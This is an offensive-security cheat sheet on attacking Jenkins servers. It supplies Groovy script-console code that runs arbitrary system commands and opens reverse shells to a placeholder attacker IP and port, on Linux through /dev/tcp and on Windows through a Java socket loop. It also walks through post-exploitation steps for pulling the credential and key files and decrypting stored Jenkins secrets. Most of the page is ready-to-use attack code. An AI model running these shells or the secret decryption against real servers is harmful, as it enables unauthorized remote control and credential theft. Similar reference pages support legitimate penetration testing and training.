# Jenkins

### Attacking

#### Script console

The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime. This can be abused to run operating system commands on the underlying server. Jenkins is often installed in the context of the root or SYSTEM account, so it can be an easy win for us

{% tabs %}
{% tab title="Linux" %}
```shellscript
# Run commands through the Jenkins script console 
def cmd = '<COMMAND>'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

# Groovy code for reverse shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
{% endtab %}

{% tab title="Windows" %}
```shellscript
# Execute commands on windows host
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");

# Reverse shell from windows host
String host="<IP>";
int port=<PORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
{% endtab %}
{% endtabs %}

#### Leveraging Known Vulnerabilities <a href="#leveraging-known-vulnerabilities" id="leveraging-known-vulnerabilities"></a>

Find version and look for vulnerabilities

### Post exploitation

Find the jenkins home directory. There is a `credentials.xml` file, which may contain user secrets in an encrypted format. To decrypt it, we need the `master.key` and `hudson.util.Secret` files, located in the / `/secrets` subdirectory

```shellscript
# Decrypt the secrets from the Jenkins script console
println(hudson.util.Secret.decrypt("{<SECRET>}"))

# Exfiltrate the files mentioned and decrypt the secrets
https://github.com/tweksteen/jenkins-decrypt
python decrypt.py master.key hudson.util.Secret credentials.xml
```
